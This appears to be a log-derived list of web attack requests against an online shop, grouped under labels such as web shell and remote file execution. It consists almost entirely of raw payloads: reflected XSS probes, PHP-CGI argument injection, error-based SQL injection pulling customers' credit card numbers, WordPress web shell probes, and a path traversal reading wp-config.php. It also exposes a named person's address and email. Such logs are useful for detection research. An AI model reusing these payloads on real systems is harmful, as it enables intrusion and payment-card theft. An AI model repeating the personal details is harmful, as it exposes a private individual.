+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AB')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.61/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000055')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000061')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000023')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000050')</script>
+attack:5  /content/.DS_Store
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000092')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D0')</script>
+attack:5  /phpslash/-0/.6/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /phpslash/-0/.6/.2/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000009')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.8/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Home/Index?<script>alert('TK0000012A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000ED')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E5')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_backup/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000078')</script>
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000125')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000080')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000064')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000054')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000093')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C0')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_derived/<script>document.cookie="testxjwa=7156;"</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_notes/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B9')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.7.1/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /_utils/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000073')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000083')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000047')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_fpclass/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B7')</script>
+attack:5  /phpslash/-0/.6/.5/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Express/default.aspx?partnerId=REDACTEDSTSP00001&sfn=Terry&sln=Kellum&sa1=2329 Dahlen Ave&sa2=Attn: Merc 1508&sc=Terre Haute&ss=IN&sz=47805&se=bob.kellum@gmail.com&t==RzJoUWwremdyOFJidWhNSCt0VWJIaExHV1F3b3V4Z1Y=
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 0,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000037')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 3,1)))--
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_pages/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F2')</script>
+attack:5  /config/.config_ucenter.php.swp
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000031')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AA')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_utils/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F6')</script>
+attack:5  /includes/spaw/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_backup/<script>document.cookie="testxjwa=7156;"</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/mod_status?<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DC')</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK0000010F')</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK0000010E')</script>
+attack:5  /Scripts/jquerybundle?<script>alert('TK00000111')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003F')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_errors/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000029')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000036')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000028')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B1')</script>
+attack:5  /Scripts/jquerybundle?<script>alert('TK00000112')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000B')</script>
+attack:5  /Content/css/cssbundle?<script>alert('TK00000101')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000066')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_objects/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F4')</script>
+attack:5  /_errors/.svn/entries
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000067')</script>
+attack:5  /admin/.svn/entries
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000118')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000011')</script>
+attack:5  /Content/css/cssbundle?<script>alert('TK00000102')</script>
+attack:5  /admin/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E7')</script>
+============================================
+ws Attack: Web Shell 
+
+attack:6  /wp-includes/Text/license.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/ms-head.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-includes/license.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-includes/class.wp-date.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-xmlrpc.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/sites/_input__.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/wp-index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/css.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/includes/class-wp-stats-clients.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/themes/hello.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/maint/restore.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+attack:6  /wp-includes/wp-css.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/license.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/wp-restore.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/wp-editors.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/wysija/wp-index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/_wp_cache.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/2014/05/wp-index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/hello.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-includes/images/include.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/2014/07/wp-index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-login.php?action=login
+attack:6  /wp-content/themes/twentyten/404.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/plugins/plugins.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/includes/images.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/plugins/cherry-plugin/license.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/css/css.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/license.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/wso.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/hellos.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/wysija/temp/wp-index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/maint/index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/wp-sys.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/_input_3_.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/2015/03/info.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/ztmxl.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/themes/satoshi/images/license.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/wysija/themes/sketchys/sket.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-includes/ms-default-base.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/2014/03/wp-index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/ms-default-base.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/2015/06/css_.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/user/license.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-includes/include.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/407.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/includes/webs-stats.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-includes/pomo/pomo.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/plugins/wp-checkout/vendors/shipping/canadapost/manager/license.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/plugins/hello.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/2014/06/wp-index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-class.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/2014/04/wp-index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-includes/class-wp-upgrade.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/includes/upload.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-includes/var.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/plugins/wp-index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/includes/license.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-includes/wp-xml.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/_input_1_test.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-css.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/includes/class-wp-static-clients.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-includes/Text/Tiff.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/wp-css.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/plugins/index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/plugins/formcraft/file-upload/server.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-includes/css/css_.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/includes/log.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/includes/index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/_input__.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-includes/class-wp-help.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/uploads/wso.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/plugins/wp-db-backup-made/system.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/wp-css.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-includes/class-wp-settings.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-admin/hh.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+attack:6  /wp-content/themes/index.php?450699&babaraba=vb&php4&root&upl&wphp4&abdullkarem&wp&module&php&php5&wphp5
+============================================
+rfe Attack: Remote File Execution 
+
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AD')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002D')</script>
+attack:5  /change_payment_card.php?order_id=51465722 and(select 1 from(select count(*),concat((select (select concat(payment_cards_id,"|",customers_id,"|",cc_type,"|",cc_number_display,"|",cc_expires,"|",address_book_id)) from bdgweb_oscsmartsubinnodb.payment_cards order by payment_cards_id desc limit 0,1),floor(rand(0)*2))x from bdgweb_oscsmartsubinnodb.payment_cards group by x)a) and 1=1--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000046')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000090')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000025')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000013')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000089')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D2')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 7,1)))--
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000117')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004C')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(payment_cards_id,":",cc_number) FROM orders LIMIT 7,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B0')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C6')</script>
+attack:5  /Error/Unknown?aspxerrorpath=/mailto:question@gsnutsandchocolates.com
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000085')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000033')</script>
+attack:5  /include/editor/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000075')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001D')</script>
+attack:5  /Scripts/customjsbundle?<script>alert('TK00000122')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000024')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000084')</script>
+attack:5  /express/defaultr.aspx?partnerId=REDACTEDSTSP00001&sfn=Terry&sln=Kellum&sa1=2329 Dahlen Ave&sa2=Attn: Merc 1508&sc=Terre Haute&ss=IN&sz=47805&se=bob.kellum@gmail.com
+attack:5  /cgi-bin/php?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000032')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000079')</script>
+attack:5  /cgi-bin/php-cgi?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000044')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000082')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000069')</script>
+attack:5  /Error/NotFound?<script>alert('TK00000005')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E0')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000014')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK00000120')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000094')</script>
+attack:5  /cgi-bin/php.fcgi?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000126')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000098')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000021')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000048')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007E')</script>
+attack:5  /<script>alert('TK00000002')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000053')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DE')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(":",cc_number) FROM orders where customers_id = 18400099 LIMIT 7,1)))--
+attack:5  /content/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000108')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000076')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003E')</script>
+attack:5  /modules/Submit/index.php?op=pre&title=<script>alert("test");</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000020')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000017')</script>
+attack:5  /phpslash/-0/.8/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C7')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006E')</script>
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000116')</script>
+attack:5  /lib/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C5')</script>
+attack:5  /Home/Index?<script>alert('TK00000129')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002C')</script>
+attack:5  /Scripts/modernizrbundle?<script>alert('TK0000011A')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(":",cc_number) FROM orders where payment_cards_id = 0 LIMIT 964175,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000100')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000018')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DD')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000043')</script>
+attack:5  /Scripts/customjsbundle?<script>alert('TK00000121')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E8')</script>
+attack:5  /calendar.php?year=2011&month="<script>alert("Trustkeeper")</script>&day=01
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000015')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000099')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000063')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000071')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EA')</script>
+attack:5  /Content/themes/base/cssbundle?<script>alert('TK0000010A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B6')</script>
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000127')</script>
+attack:5  /include/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F0')</script>
+attack:5  /phpslash/-0/.6/.1/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000049')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F9')</script>
